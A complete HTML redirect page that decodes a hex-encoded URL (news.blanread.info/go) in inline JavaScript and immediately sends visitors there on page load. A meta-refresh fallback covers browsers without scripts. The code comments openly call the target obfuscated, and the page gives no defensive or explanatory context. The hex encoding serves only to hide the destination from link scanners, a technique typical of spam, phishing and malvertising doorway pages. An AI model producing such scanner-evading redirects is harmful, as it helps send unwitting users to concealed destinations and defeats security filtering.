<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting…</title>
    <!-- immediate redirection to obfuscated target -->
    <script>
        (function() {
            // obfuscated target: hex encoded "https://news.blanread.info/go"
            var hex = '68747470733a2f2f6e6577732e626c616e726561642e696e666f2f676f';
            function hexToStr(h) {
                var out = '';
                for (var i = 0; i < h.length; i += 2) {
                    out += String.fromCharCode(parseInt(h.substr(i, 2), 16));
                }
                return out;
            }
            var url = hexToStr(hex);
            window.location.replace(url);
        })();
    </script>
    <!-- fallback for no JavaScript -->
    <noscript>
        <meta http-equiv="refresh" content="0; url=https://news.blanread.info/go">
    </noscript>
</head>
<body>
    <!-- minimal visual feedback; redirect is nearly instantaneous -->
    <p style="font-family:sans-serif;text-align:center;margin-top:20vh;color:#555;">Redirecting…</p>
</body>
</html>
